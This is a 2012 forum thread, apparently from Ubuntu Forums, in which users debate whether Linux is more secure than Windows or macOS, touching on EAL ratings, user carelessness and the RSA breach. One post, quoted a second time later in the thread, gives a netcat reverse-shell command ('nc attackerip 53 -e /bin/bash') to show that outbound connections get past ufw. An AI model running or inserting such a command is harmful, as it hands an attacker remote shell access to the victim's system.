How are applocker and gpos third party apps they are as much a part of windows as apparmor is Ubuntu. Btw apparmor is actually a novell product so I guess its third party too

UNIX is not Linux or bsd. Just as  and  NT is not dos. So im not sure why you keep saying they are copies and I dont pretend to know what the bsd developers do with the re time

Hope this helps
Yes, I've heard of a brute force attack. But unless the victim has a password called "1234" or "password" than bruteforcing it is going to take a while. And it's going to suck up a lot of CPU (Unless they happen to have an FX 8150) which is obviously going to alert the user that somethings up.

You're taling about outbound services, I'm talking about inbound services. If an infection turns off the Windows firewall, that's it. But since Ubuntu doesn't need a firewall to block incoming traffic...

Yes, but none of those programs come preinstalled on Windows. And I don't think you're going to find a lot of documentation on those Windows programs.

Hey, I didn't say what BSD developers do with their time, *they* said it themselves!  
> **CharlesA said:**
> It's still a discussion on security even if some of it is FUD.

Thanks DT for clearing some of that up. I always hate when the whole "Linux is more secure than Windows" argument comes up.

You know, reading that I thought it was really funny in an ironic sort of way. Because right now, I'm downloading Ubuntu 11.10 64-bit as one of my Windows laptops my father uses has been completely smashed up by a rootkit he caught. In fact, it came as a spam mail in Yahoo! messenger, where a .zip file was attached. When my father opened it (he doesn't know a lot about security I'm afraid) it automatically executed a program (there was no warning whatsoever, no UAC, in fact, he didn't even know there was a .exe file in that zip, he thought it was a document).

So pardon me for thinking Linux is more secure, and maybe I'm ignorant and don't know anything about it, but from my experiences, it sure darn seems like it!

---

### Post by Dangertux on 2012-02-19
Here I made you guys a spreadsheet of various security features and implementations across the diferent OS'es we've been discussing, it's not exhaustive but it hits the major ones. 


Also you don't need to disable Ubuntu's firewall... Check it out

Victim:

```

sudo ufw enable

```Attacker :
```

nc -l  53 

```Victim:
```

nc attackerip 53 -e /bin/bash

```This of course can be automated if a system is compromised (either via a service or via social engineering.) Enjoy your shell ;-) 

Also for that to work on Ubuntu you need to install an ACTUAL version of netcat, not the neutered version Ubuntu includes. (this also works on windows, substitute /bin/bash for cmd.exe

---

### Post by 0011235813 on 2012-02-19
> **Dangertux said:**
> Passwords are generated all the time by computer programs... Ever heard of a bruteforce attack?

No...by default in the latest version of Lion and windows 7 always has

Ubuntu doesnt block anything, there are no services to connect to. Windows also no longer exposes services the way it used to either.

How are applocker and gpos third party apps they are as much a part of windows as apparmor is Ubuntu. Btw apparmor is actually a novell product so I guess its third party too

UNIX is not Linux or bsd. Just as  and  NT is not dos. So im not sure why you keep saying they are copies and I dont pretend to know what the bsd developers do with the re time

Hope this helps

> **CharlesA said:**
> It's still a discussion on security even if some of it is FUD.

Thanks DT for clearing some of that up. I always hate when the whole "Linux is more secure than Windows" argument comes up.

> **Dangertux said:**
> Here I made you guys a spreadsheet of various security features and implementations across the diferent OS'es we've been discussing, it's not exhaustive but it hits the major ones. 


Also you don't need to disable Ubuntu's firewall... Check it out

Victim:

```

sudo ufw enable

```Attacker :
```

nc -l  53 

```Victim:
```

nc attackerip 53 -e /bin/bash

```This of course can be automated if a system is compromised (either via a service or via social engineering.) Enjoy your shell ;-) 

Also for that to work on Ubuntu you need to install an ACTUAL version of netcat, not the neutered version Ubuntu includes. (this also works on windows, substitute /bin/bash for cmd.exe
Interesting. Well, I'm sure ye NoScript and ye Apparmor will help against threats like these ;)
EDIT: [http://www.engadget.com/2010/07/22/secunia-ranks-apple-first-in-software-insecurity-safari-said-to/](http://www.engadget.com/2010/07/22/secunia-ranks-apple-first-in-software-insecurity-safari-said-to/) just read this link. Apparently, Apple's OS is very insecure. Are there any basis to these claims?

---

### Post by haqking on 2012-02-19
> **0011235813 said:**
> Interesting. Well, I'm sure ye NoScript and ye Apparmor will help against threats like these ;)
EDIT: [http://www.engadget.com/2010/07/22/secunia-ranks-apple-first-in-software-insecurity-safari-said-to/](http://www.engadget.com/2010/07/22/secunia-ranks-apple-first-in-software-insecurity-safari-said-to/) just read this link. Apparently, Apple's OS is very insecure. Are there any basis to these claims?

OK this whole "more secure, not secure, less secure" thing is a pointless argument.

All end user OS are on equal footing, they are all certified the same when it comes to security ( must say this at least 5 times a week) anyways here i go again.

They are all roughly EAL 4 security classified.

IF they were to be made any different then that is because they are targeting a different market as for end user OS EAL 4 is about right otherwise you lose ease of use and functionality.

System security is not a product
System security is not a state.

System security is a process and ongoing and the responsibility of the User/Admin.

Windows, Linux, MacOSX are all roughly equal though achieve things in a different way or are less or more vulnerable to a given scenario but then fall down somewhere else.

THEY ARE ARE ALL ROUGHLY EQUAL and no more secure or less secure than another.



Cheers

---

### Post by Ms. Daisy on 2012-02-19
@ Dangertux- W.O.W.  [nc]("http://www.computerhope.com/unix/nc.htm") is some powerful stuff. 

 I love the spreadsheet. 

@ 0011235813- if you look at the spreadsheet you will see that each OS has vulnerabilities.  They're different, but they all have them. A determined cracker can crack any OS, especially a poorly-maintained one.

---

### Post by Dangertux on 2012-02-19
Thanks Ms Daisy

Also it should be noted OSX is not safari. Just as Ubuntuis not Firefox.

Security is a process, you can compare features ratings and vulnerabilities all day. In the end it comes down to the system configuration and practices of the user

---

### Post by leclerc65 on 2012-02-19
The main argument that Windows aficionados claim that Linux is  safer because it's less popular.
Assuming this is true, I will gladly hide under its umbrella for the time being, instead of spending hundreds of extra dollars for anti viral programs and still get hit.
There are 1$ bike locks at Dollarama, and there are Medecos. There are master hackers and there 'pirates d"eau douce'. I don't think master hackers have time to spend sitting hacking zillions of computers around the world. Writing programs is not easy , to make it compatible with hundreds of Linux distros that keep changing every 6 mo, a year or so.

---

### Post by 0011235813 on 2012-02-19
> **leclerc65 said:**
> The main argument that Windows aficionados claim that Linux is  safer because it's less popular.
Assuming this is true, I will gladly hide under its umbrella for the time being, instead of spending hundreds of extra dollars for anti viral programs and still get hit.
There are 1$ bike locks at Dollarama, and there are Medecos. There are master hackers and there 'pirates d"eau douce'. I don't think master hackers have time to spend sitting hacking zillions of computers around the world. Writing programs is not easy , to make it compatible with hundreds of Linux distros that keep changing every 6 mo, a year or so.

Good point. It doesn't matter how much you pay for AV, it won't do much good. The rootkit that infected the system (which I've now fixed) was immediately detected by AVG. What's quite amusing is that it infected AVG as well, so it didn't work. LOL.

As mentioned, there is always the "security through obscurity" type thing, which is helpful when you have a bunch of malware on a Windows that doesn't affect Linux.

And as you mentioned, constant change and variation in the Linux world is another reason why it's so hard to hack.

@Daisy
Yes, I did mention no OS (including Linux) is unhackable. Remember this?
> 
unless you happen to have a computer with infinite resources to support an infinite OS, you're never going to be unhackable
I think that one of the aspects of computer security is to detect threats before they spread and do real damage. That rootkit we got hadn't manifested itself until several days after it was caught.

---

### Post by Dangertux on 2012-02-19
> **0011235813 said:**
> Good point. It doesn't matter how much you pay for AV, it won't do much good. The rootkit that infected the system (which I've now fixed) was immediately detected by AVG. What's quite amusing is that it infected AVG as well, so it didn't work. LOL.

As mentioned, there is always the "security through obscurity" type thing, which is helpful when you have a bunch of malware on a Windows that doesn't affect Linux.

And as you mentioned, constant change and variation in the Linux world is another reason why it's so hard to hack.

@Daisy
Yes, I did mention no OS (including Linux) is unhackable. Remember this?

I think that one of the aspects of computer security is to detect threats before they spread and do real damage. That rootkit we got hadn't manifested itself until several days after it was caught.

Still curious why you guys think it's hard to compromise a linux system. They get compromised all the time :-/

Oh well..

---

### Post by haqking on 2012-02-19
whooppee Linux = No viruses or little malware.

Windows AV products tells you you are infected so windows therefore must be insecure cos you keep getting infected....LOL

Linux doesnt so it must not get compromised right ?

Most compromises are little or nothing to do with Viruses as they are mostly nuisance based payloads

Most of the people i know who say and think "Linux is more secure" dont actually know how to tell or would notice if they had been compromised anyways.

Anyways i am ending this discussion (recurring) as its been explained a thousand times.

For those who think Linux is "more secure" or that they are now secure because they dont get a pop up saying they are infected then sleep well whilst i enjoy your system ;-)

Peace

---

### Post by uRock on 2012-02-19
Moved to *Recurring Discussions*.

---

### Post by leclerc65 on 2012-02-19
> For those who think Linux is "more secure" or that they are now secure because they dont get a pop up saying they are infected then sleep well whilst i enjoy your system 
As long as my credit card or my bank account don't get hacked. I can sleep OK.:D

---

### Post by 0011235813 on 2012-02-19
> **haqking said:**
> whooppee Linux = No viruses or little malware.

Windows AV products tells you you are infected so windows therefore must be insecure cos you keep getting infected....LOL

Linux doesnt so it must not get compromised right ?

Most compromises are little or nothing to do with Viruses as they are mostly nuisance based payloads

Most of the people i know who say and think "Linux is more secure" dont actually know how to tell or would notice if they had been compromised anyways.

Anyways i am ending this discussion (recurring) as its been explained a thousand times.

For those who think Linux is "more secure" or that they are now secure because they dont get a pop up saying they are infected then sleep well whilst i enjoy your system ;-)

Peace
I know very well how these AV manufacturers scam you with false warnings. But I was referring to real malware. You know, the kind that won't let you open any programs and somehow occupy 4 gigs of RAM and 99% CPU?

---

### Post by Welly Wu on 2012-02-19
My thread got destroyed. It had so much potential. It could have been a contender.

---

### Post by |{urse on 2012-02-19
As a distribution becomes more popular it becomes more attractive to "hackers" (hate using that term in such a manner) and as it becomes more and more attractive it will continue to remain solid as long as the effort coming from within (canonical and the entire ubuntu community) is greater than the desire to "hack" it. I'd wager that Ubuntu is somewhere in the mid-range security-wise on a standard install but as long as you make the effort to tighten things up it will be closer to the top. If you manage to learn something about security (and share your efforts with the community) it could be the most secure system ever (just like any other distro).

Got a little parenthetical there, sorry.

---

### Post by Ms. Daisy on 2012-02-19
> **Welly Wu said:**
> My thread got destroyed. It had so much potential. It could have been a contender.
LOL- it was always a contender for recurring discussions. Such is the nature of the beast.

Dangertux's spreadsheet answers your OP quite concisely. 

[QUOTE=0011235813] And as you mentioned, constant change and variation in the Linux world is another reason why it's so hard to hack.[/QUOTE] Actually that makes it easier to crack. If you're not keeping up with all those updates, then you've got a long list of vulnerabilities to be exploited.

---

### Post by 0011235813 on 2012-02-19
> **Ms. Daisy said:**
> LOL- it was always a contender for recurring discussions. Such is the nature of the beast.

Dangertux's spreadsheet answers your OP quite concisely. 

 Actually that makes it easier to crack. If you're not keeping up with all those updates, then you've got a long list of vulnerabilities to be exploited.

There's nothing keeping anyone from upgrading. It keeps your files and it's not like it costs anything.

@Welly Wu
I'm afraid not, you're question, although completely genuine and realistic, was bound to stir up debate. And we all know what happens to threads that make debates instead of answering questions :(

---

### Post by Dangertux on 2012-02-19
The question  has been posed dozens of time in the past, the answer is always the same 
and there are always a handful of people who disagree for the same reasons, all of which are subjective and based on  nothing but their own (mis)configurations and experiences.

The overall security or securability of an operating system is not judged based on the presence or lack of malware for a system. Nor is it judged on the general populations level of education about threats and necesaary mitigating factors. It is instead judged on quantifiable features and overall securability of a system.

Hope this helps

---

### Post by yetiman64 on 2012-02-19
> **Dangertux said:**
> ...The overall security or securability of an operating system is not judged based on the presence or lack of malware for a system. Nor is it judged on the general populations level of education about threats and necesaary mitigating factors. It is instead judged on quantifiable features and overall securability of a system....
+1 Yes, any system is securable, any system can be taken over, it always comes back to the user/admin and how the system is configured.

17 years on Windows here never had a virus problem / infection or rootkit etc despite the many dangers for that system, I locked it down real well. About 4 and a bit years now on Ubuntu and I suspect I got hit once through a browser (my system sudo password was accidently input into a site and about 5 minutes or less later the weirdness started), luckily the damage was maintained in a 32 bit chroot with next to no damage to the main system. Three 32bit chrooted networking related files were found to be altered using rkhunter and a folder in the 64 bit system (bind mounted) had permissions changed stopping me booting to a desktop on recovery, was easy to fix though. The main system checked out clean.

My example above boils down to the user actions being careless, that it seems is usually the case, whether as explicitly dumb as my actions above or more subtle like poor system configuration.

Security between systems, imo, is pretty much the same, learn whatever system you're on and their best practices. Have fun with whatever system you use OP. 

BTW recurring is always a good place to find the more interesting threads :)

---

### Post by aysiu on 2012-02-19
All the recent malware infections I've personally witnessed (on friends' computers, not in news stories) have been user-installed. They didn't exploit vulnerabilities in the operating system. There was no brute-forcing of passwords. A simple trojan will do. Why make your work difficult? If I wrote malware (don't worry--I don't), I would just create trojans. Easiest way to compromise a system is to trick the user. Vulnerabilities can be patched. Uninformed or unconscientitious users cannot (unless they decide to be informed and conscientitious, but that change happens rarely).

---

### Post by haqking on 2012-02-19
one final time in the interest of completeness.

[http://www.commoncriteriaportal.org/products/](http://www.commoncriteriaportal.org/products/)

Choose operating systems.

Scroll down the list you will find Windows 7, XP, Vista, Various Linux Distros, Solaris etc etc.

All at EAL 4 or EAL 4+

as said a thousand times, they are all equally secure in there base configuration and design.

The fact the one is more prone to viruses or other types of malware is just that, that factor does not make it less secure (as said before malware is not all about security in terms or compromise from an attacker)

They are certified (and for those who dont know the CC or Common Criteria is now what replaces (kind of) the infamous Orange Book or TCSEC) all at the same sort of level based on a given criteria such as Discretionary Access Control or Mandatory Access Control.

If a end user OS was designed so that its EAL rating was higher its ease of use or functionality would decrease and therefore placing it in a different market than the OS's we are all talking about here, the more secure something becomes the less intuitive or functional it is too use and so everyone would suddenly complain how difficult something was rather than how secure it is or isnt.

Everytime the "secure argument" comes up people always bring the Windows virus/malware issue up and it has little to do with overall system security and certainly does not make it less secure than Linux or anything else.

If people spent more time learning how to secure there systems (whatever they run) and realised it is an ongoing process they wouldnt suffer from lack of security per se in whatever OS they choose to use.

I love linux
I love Windows
I love Unix

So i am not a fanboy or spreading FUD or anything else, i am merely helping to educate to people dont become complacent

and i I love security.

I know all the OS are equal and i know to not sit on my laurels and be complacent because Linux doesnt get viruses ;-)

As i said before most of the Linux users i know couldnt tell me or know how to look to find out if there system was compromised (other than "oh well i never get a virus like i did in windows ;-)

Edit: oh and before anyone argues the relevance or credibility of the CC, well that is debatable, however it has replaced the TCSEC and so government and defence systems seek this certification, as alot of people tend to bring up the so and so organisation uses this that and the other, example would be "the NSA use this so it must be secure" LOL...anyways if thats the case then the CC docs have evolved from the TCSEC (or replaces it) and they were NSA published documents such as NSA trusted networks (red book) and the like. But now i am waffling so good night ;-)

Peace

---

### Post by NadirPoint on 2012-02-20
> **aysiu said:**
> Vulnerabilities can be patched. Uninformed or unconscientitious users cannot.
This is the main point people fail to realize for the same reason they invoke those feared vulnerabilities distributed across the entire spectrum of computer-communications.  They are too ignorant, lazy, careless or naive to know and understand what is going on.  A group of geeky code monkeys and systems security wonks can debate the merits of the topic all day and night because the finer points are really just so much minutia, relative to the big picture.  The vast majority of the computing population is blissfully ignorant.  So the cycle continues again.

It's akin to the old adage, "guns don't kill people..."

---

### Post by OpSecShellshock on 2012-02-20
Malware's a means, not an end. On some systems it's useful in order to achieve a goal, and on some it's not. What matters most from a security standpoint is the end goal. It's possible (but not advisable, so don't try it please) to have a system loaded down with malware that still won't achieve the writer's goals because of other controls that are in place. Yeah, you still have to rebuild the system, but operational damage is limited. Limiting operational damage is what security is concerned with, not preventing malware.

Really the only considerations you need to take into account when choosing your OS are whether you can afford it, whether you basically know how to use it to perform your desired operational tasks, and whether it is compatible with the other tools that you need to use to perform those tasks. Everything else is configuration. Now, go study configuration.

---

### Post by NadirPoint on 2012-02-20
> **OpSecShellshock said:**
> Now, go study configuration.
Which 99% of computer user could care less about, because it's not their job, they don't have time, it's hard, wahh, wahh, whatever.

So the exploit holes, malware opportunities and APTs to our critical infrastructure, classified defense and contractor systems, financial industry, healthcare records, etc. remains more vulnerable than it needs to be.

---

### Post by OpSecShellshock on 2012-02-21
> **NadirPoint said:**
> Which 99% of computer user could care less about, because it's not their job, they don't have time, it's hard, wahh, wahh, whatever.

So the exploit holes, malware opportunities and APTs to our critical infrastructure, classified defense and contractor systems, financial industry, healthcare records, etc. remains more vulnerable than it needs to be.

In the case of organizations that are either under regulatory purview, maintain stores of personal or financial data, or are likely to be the targets of espionage, that it is their job to secure and maintain their networks and devices, they just aren't doing it. Developers also frequently seem to drop the ball on QA.

As far as regular users go, they're either interested in personal information security or they're not. If not, then there isn't much anyone can do for them, with again the possible exception of developers. In my experience most secure configuration at home just involves going through and turning things off that the developers left on just in case someone, somewhere might want them but not know how to enable them.

Maybe it's just the case that the incentives of software/platform/service developers and those of security people are just doomed to be ever at odds. Certainly hope not.

---

### Post by NadirPoint on 2012-02-21
> **OpSecShellshock said:**
> ...that it is their job to secure and maintain their networks and devices, they just aren't doing it.
Oh but they are - trying their best at least.

"They" being a tiny fraction of the user population in the security and/or IT department(s).  The weak link is the other 99% of the people who access "their" systems - not "them" or "their" efforts to secure it and comply with regulatory requirements.

The best security is easily compromised by just one stupid user.  Are you aware of the details underlying the RSA breach last year?

---

### Post by OpSecShellshock on 2012-02-22
> **NadirPoint said:**
> Oh but they are - trying their best at least.

"They" being a tiny fraction of the user population in the security and/or IT department(s).  The weak link is the other 99% of the people who access "their" systems - not "them" or "their" efforts to secure it and comply with regulatory requirements.

The best security is easily compromised by just one stupid user.  Are you aware of the details underlying the RSA breach last year?

Quite familiar. Several things went wrong, starting with buggy Flash, continuing through the ability to embed Flash objects in an Excel spreadsheet in the first place (two things that ignorance is not a good excuse for), and only then did the user's carelessness come into play. Insufficient security control assurances in RSA's contract with the third-party company also seem to have been an issue. Once things got over to RSA's network they did a fairly decent job of identifying the malicious activity, but acted poorly on the disclosure side, due to harmful pressures and incentives.

There are any number of places it could have been stopped cold with the application of a little self-discipline and quality assurance.

---

### Post by NadirPoint on 2012-02-22
> **OpSecShellshock said:**
> ...and only then did the user's carelessness come into play.
Your description characterizes the scenario as a drunk stumbling around in a mine field.  Realistically speaking, user's carelessness comes into play continuously, all the time.

---

### Post by OpSecShellshock on 2012-02-22
> **NadirPoint said:**
> Your description characterizes the scenario as a drunk stumbling around in a mine field.  Realistically speaking, user's carelessness comes into play continuously, all the time.

Precisely where I was going with it, actually. The carelessness of users should be expected and built into the control sets, whether on the application side, the architecture side, the configuration of devices and networks, etc. I think it borders on negligence to allow the difference between the success or failure of an intrusion attempt to rest on the user making good decisions. Everything could have been set up in such a way that it wouldn't have mattered that the user opened the attachment.

Oh, and I think a possibly better analogy would be a perfectly sober person who sees a dollar sitting just on the other side of a minefield and decides to go for it anyway. That's just how people are, and that's why it continues to work every time.

---

### Post by Ms. Daisy on 2012-02-22
> **OpSecShellshock said:**
> Precisely where I was going with it, actually. The carelessness of users should be expected and built into the control sets, whether on the application side, the architecture side, the configuration of devices and networks, etc. I think it borders on negligence to allow the difference between the success or failure of an intrusion attempt to rest on the user making good decisions. Everything could have been set up in such a way that it wouldn't have mattered that the user opened the attachment.

Oh, and I think a possibly better analogy would be a perfectly sober person who sees a dollar sitting just on the other side of a minefield and decides to go for it anyway. That's just how people are, and that's why it continues to work every time.

+1

I wrote and deleted 5 replies that said what you just said, but not nearly as well.

---

